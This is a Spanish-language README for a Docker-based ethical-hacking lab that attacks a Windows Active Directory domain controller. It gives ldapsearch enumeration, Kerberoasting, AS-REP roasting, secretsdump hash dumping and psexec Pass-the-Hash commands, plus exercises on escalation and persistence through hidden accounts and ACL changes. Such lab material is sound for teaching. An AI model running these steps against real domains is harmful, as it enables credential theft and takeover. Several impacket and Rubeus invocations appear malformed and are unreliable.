# Lab 4: Explotación de Active Directory — Windows Domain Controller

## Objetivos

- Comprender la arquitectura y componentes de Windows Active Directory
- Enumerar usuarios, grupos y permisos en un dominio AD
- Explotar vulnerabilidades comunes en AD (Kerberoasting, AS-REP Roasting)
- Realizar Pass-the-Hash y Pass-the-Ticket
- Escalar privilegios en un entorno de AD
- Documentar hallazgos y técnicas de explotación

## Prerrequisitos

- Docker Engine 24.0 o superior
- Docker Compose 2.0 o superior
- 16GB RAM mínimo (AD requiere recursos)
- 30GB de almacenamiento disponible
- Conocimiento básico de Windows y Kerberos

## ⚠️ IMPORTANTE: Windows Server en Docker

Este lab usa imágenes de Windows Server que:
- Son GRANDES (~3GB por descarga)
- Requieren VM de Windows o soporte experimental en Linux
- **En macOS/Linux**: Puedes usar WSL2 (Windows) o emulador de AD basado en Linux (ver alternativa más abajo)

### Alternativa Recomendada para macOS/Linux: GOAD (Game of Active Directory)

Si tu Docker host no soporta contenedores Windows, usa GOAD:

```bash
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD
docker-compose up -d
```

---

## Arquitectura

```
lab4-net (172.18.4.0/24)
├── dc01 (172.18.4.10:389/636/88) — Domain Controller (Windows Server 2022)
│   ├── Port 389: LDAP
│   ├── Port 636: LDAPS
│   ├── Port 88: Kerberos
│   └── Port 3389: RDP (para debugging)
├── member01 (172.18.4.20) — Member Server (Windows Server 2022)
│   └── Unido al dominio lab.local
└── kali (172.18.4.30) — Atacante con herramientas AD (Kali Linux)
    ├── Port 445: SMB (para conexiones a DC)
    └── Herramientas: impacket, rubeus, bloodhound
```

## Quick Start

### Paso 1: Verificar soporte de Windows Server en Docker

```bash
docker ps --all
# Buscar si hay contenedores Windows
# Si ves error "Windows containers required", necesitas cambiar Docker a modo Windows
```

### Paso 2: Ir al directorio del lab

```bash
cd /ruta/a/Ethical_Hacking/docker-labs/lab4
```

### Paso 3: Levantar el lab

```bash
# ⚠️ NOTA: Primera descarga tomará 10-15 minutos (~3GB)
docker compose up -d

# Esperar a que DC se inicialice (60+ segundos)
sleep 60

# Verificar estado
docker compose ps
```

**Output esperado**:
```
CONTAINER ID   IMAGE                           COMMAND                  STATUS
abc123def456   mcr.microsoft.com/...servercore "powershell -C..."       Up 58 seconds
def456ghi789   mcr.microsoft.com/...servercore "powershell -C..."       Up 52 seconds
ghi789jkl012   kalilinux/kali-rolling:2025.1   "tail -f /dev/null"      Up 45 seconds
```

### Paso 4: Verificar conectividad LDAP desde Kali

```bash
# Entrar a Kali
docker compose exec kali bash

# Instalar herramientas
apt update && apt install -y ldap-utils python3-pip

# Probar LDAP bind
ldapsearch -x -H ldap://dc01 -b "dc=lab,dc=local"
```

## Laboratorio

### Fase 1: Setup del Dominio

**Esperar a que Active Directory esté listo**:

```bash
# Revisar logs del DC
docker compose logs dc01 | tail -20

# Buscar "Active Directory está listo" o similar
```

**Paso 1: Obtener credenciales del DC**

Usa las credenciales especificadas en docker-compose.yml:
- **Usuario**: `Administrator`
- **Contraseña**: Definida en variable de entorno (ver docker-compose.yml)
- **Dominio**: `lab.local`

### Fase 2: Enumeración de AD

**Objetivo**: Mapear usuarios, grupos y permisos

```bash
# Entrar a Kali
docker compose exec kali bash

# Instalar herramientas de enumeración
apt install -y ldap-utils python3-impacket python3-pip
pip install ldapdomaindump

# Enumeración LDAP básica
ldapsearch -x -H ldap://dc01 -b "dc=lab,dc=local" -D "cn=Administrator,cn=Users,dc=lab,dc=local" -w "PASSWORD"

# Enumeración de usuarios
ldapsearch -x -H ldap://dc01:389 -b "dc=lab,dc=local" "(objectClass=user)" sAMAccountName userPrincipalName

# Enumeración de grupos
ldapsearch -x -H ldap://dc01:389 -b "dc=lab,dc=local" "(objectClass=group)" cn

# Dump completo del AD
ldapdomaindump -u "lab.local\\Administrator" -p "PASSWORD" dc01 -o /tmp/ldapdump
```

### Fase 3: Kerberoasting

**Objetivo**: Robar tickets Kerberos de cuentas de servicio

```bash
# Usar impacket para Kerberoasting
python3 -c "from impacket.examples.GetUserSPNs import *; main()"

# O usar Rubeus (si está disponible en Kali)
# ruby /usr/share/rubeus/Rubeus.rb kerberoast /domain:lab.local
```

### Fase 4: Explotación de AS-REP Roasting

**Objetivo**: Obtener TGT de usuarios sin preauthenticación

```bash
# Buscar usuarios sin Kerberos pre-auth
ldapsearch -x -H ldap://dc01 -b "dc=lab,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Obtener AS-REP para usuario vulnerable
python3 -c "
from impacket.examples.GetNPUsers import *
import sys
sys.exit(main())
" -no-pass -dc-ip dc01 lab.local/vulnerable_user
```

### Fase 5: Pass-the-Hash (PTH)

**Objetivo**: Usar hash NTLM en lugar de contraseña

```bash
# Dumpar hashes NTLM usando impacket
python3 -m impacket.secretsdump -just-dc lab.local/Administrator@dc01

# Usar hash para conectarse (PtH)
python3 -m impacket.psexec -hashes LM:NT lab.local/Administrator@dc01 cmd.exe
```

### Fase 6: Análisis con BloodHound

**Objetivo**: Visualizar relaciones de confianza y privilegios en AD

```bash
# Instalar BloodHound collector (SharpHound en Kali)
apt install -y bloodhound

# O usar Python collector
pip install bloodhound

# Recolectar datos
# Nota: En Docker puede ser limitado; mejor ejecutar desde una máquina con acceso RDP
```

## Expected Output

### Verificación de AD inicializado:

```bash
$ docker compose logs dc01 | grep -i "active directory"
dc01 | Active Directory Domain Services installation completed successfully

$ ldapsearch -x -H ldap://dc01 -b "dc=lab,dc=local" | head -20
dn: dc=lab,dc=local
objectClass: top
objectClass: dcObject
objectClass: organization
dc: lab
```

### Enumeración de usuarios:

```bash
$ ldapsearch -x -H ldap://dc01 -b "dc=lab,dc=local" \
  -D "cn=Administrator,cn=Users,dc=lab,dc=local" -w "PASSWORD" \
  "(objectClass=user)" sAMAccountName

dn: cn=Administrator,cn=Users,dc=lab,dc=local
sAMAccountName: Administrator

dn: cn=krbtgt,cn=Users,dc=lab,dc=local
sAMAccountName: krbtgt
```

## Exercises

### Exercise 1: Mapeo Completo de AD
**Objetivo**: Documentar todos los usuarios, grupos y permisos

**Pasos**:
```bash
docker compose exec kali bash
ldapdomaindump -u "lab.local\\Administrator" -p "PASSWORD" dc01 -o /tmp/ad_dump
cat /tmp/ad_dump/domain_users.html
```

### Exercise 2: Kerberoasting
**Objetivo**: Extraer y crackear tickets de servicio

**Pasos**:
1. Enumerar SPNs
2. Solicitar tickets
3. Crackear offline con John o Hashcat

### Exercise 3: AS-REP Roasting
**Objetivo**: Atacar usuarios sin pre-auth

**Pasos**:
1. Identificar usuarios vulnerables
2. Solicitar AS-REP
3. Crackear con Hashcat

### Exercise 4: Escalada de Privilegios
**Objetivo**: De usuario normal a Domain Admin

**Pasos**:
1. Obtener acceso inicial
2. Enumerar grupos locales
3. Explotar confianzas de dominio

### Exercise 5: Persistencia en AD
**Objetivo**: Mantener acceso a través de múltiples técnicas

**Pasos**:
1. Crear cuentas ocultas
2. Modificar ACLs
3. Documentar técnicas

## Troubleshooting

### Problema: Docker no soporta Windows Server (en macOS/Linux)
**Síntomas**: `Error: image operating system "windows" cannot be used on this platform`
**Solución**:
```bash
# Opción 1: Usar GOAD en su lugar
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD && docker-compose up -d

# Opción 2: Cambiar a Linux-based AD simulator (Samba)
# Editar docker-compose.yml para usar imagen Samba
```

### Problema: DC no se inicializa (lentitud)
**Síntomas**: DC lleva >5 minutos en iniciar
**Solución**:
```bash
# Revisar logs
docker compose logs dc01 -f

# Esperar más tiempo (Windows es lento)
sleep 120

# Verificar recursos de Docker
docker stats
```

### Problema: LDAP connection refused
**Síntomas**: `Connection refused (111)` en ldapsearch
**Solución**:
```bash
# Verificar que el DC está corriendo
docker compose ps dc01

# Probar conectividad
docker compose exec kali ping dc01

# Revisar logs
docker compose logs dc01
```

### Problema: No puedo conectarme por RDP (remoto)
**Síntomas**: `rdp: connection refused`
**Solución**:
```bash
# RDP generalmente no funciona en Docker
# Usa PowerShell remoto en su lugar:
docker compose exec dc01 powershell

# O exec directo:
docker compose exec -u Administrator dc01 powershell -c "whoami"
```

## Testing Checklist

- [ ] `docker compose up -d` completa sin errores
- [ ] `docker compose ps` muestra 3 contenedores en estado `Up`
- [ ] DC tardó ~60 segundos en iniciar
- [ ] `ldapsearch` conecta exitosamente
- [ ] Usuarios se pueden enumerar con LDAP
- [ ] Grupos se pueden enumerar
- [ ] Kerberoasting extrae tickets
- [ ] AS-REP Roasting funciona
- [ ] Pass-the-Hash se puede demostrar
- [ ] Reporte AD está documentado

## Cleanup

```bash
# Parar servicios
docker compose down

# Eliminar volúmenes
docker compose down -v

# Eliminar imágenes Windows Server (OPCIONAL - son grandes)
docker rmi mcr.microsoft.com/windows/servercore:ltsc2022 kalilinux/kali-rolling
```

## Recursos

- [Active Directory Security Best Practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [Kerberoasting Explained](https://attack.mitre.org/techniques/T1558/003/)
- [Pass-the-Hash](https://attack.mitre.org/techniques/T1550/002/)
- [BloodHound](https://bloodhound.readthedocs.io/)
- [GOAD - Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
- [Adsecurity.org AD Blog](https://adsecurity.org/)
